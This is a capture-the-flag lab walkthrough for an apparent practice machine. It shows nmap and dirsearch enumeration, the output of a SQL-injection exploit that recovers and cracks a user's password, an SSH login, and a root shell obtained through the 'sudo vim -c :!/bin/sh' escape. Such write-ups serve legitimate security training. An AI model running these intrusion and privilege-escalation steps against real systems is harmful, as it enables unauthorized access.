# Notes

# Enumeration

## Nmap

```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.131.169
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)

```

## Dirsearch

```bash
Target: http://simplectf.thm/

[21:04:42] Starting:                                                                                                                                                      
[21:04:45] 403 -  299B  - /.ht_wsr.txt                                      
[21:04:45] 403 -  302B  - /.htaccess.bak1                                   
[21:04:45] 403 -  302B  - /.htaccess.orig                                   
[21:04:45] 403 -  304B  - /.htaccess.sample                                 
[21:04:45] 403 -  302B  - /.htaccess.save
[21:04:45] 403 -  303B  - /.htaccess_extra                                  
[21:04:45] 403 -  302B  - /.htaccess_orig
[21:04:45] 403 -  300B  - /.htaccessBAK
[21:04:45] 403 -  300B  - /.htaccess_sc
[21:04:45] 403 -  301B  - /.htaccessOLD2
[21:04:45] 403 -  300B  - /.htaccessOLD
[21:04:45] 403 -  292B  - /.htm                                             
[21:04:45] 403 -  293B  - /.html                                            
[21:04:45] 403 -  298B  - /.htpasswds                                       
[21:04:45] 403 -  299B  - /.httr-oauth
[21:04:45] 403 -  302B  - /.htpasswd_test
[21:04:46] 403 -  292B  - /.php                                             
[21:05:13] 200 -  540B  - /robots.txt                                       
[21:05:14] 403 -  301B  - /server-status                                    
[21:05:14] 403 -  302B  - /server-status/                                   
[21:05:15] 301 -  315B  - /simple  ->  http://simplectf.thm/simple/
```

![image.png](screenshots/5-WAPP.png)

### Password (Exploit SQL injection)

![image.png](screenshots/6-Password.png)

```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

# Exploit

## SSH

```bash
 ssh mitch@simplectf.thm -p 2222
The authenticity of host '[simplectf.thm]:2222 ([10.64.135.113]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[simplectf.thm]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mitch@simplectf.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 

```

## User’s flag

```bash
$ cd /home
$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 .
drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
$ cd mitch
$ ls -la
total 36
drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
-rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
$ cat user.txt
G00d j0b, keep up!

```

# Enumeration

```bash
sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```

### Root’s flag

```bash
$ sudo vim -c ':!/bin/sh'

# whoami
root
# cd /home
# ls -la
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 .
drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
# find / -type f -name root.txt
find: ‘/run/user/108/gvfs’: Permission denied
/root/root.txt
# cat /root/root.txt
W3ll d0n3. You made it!

```
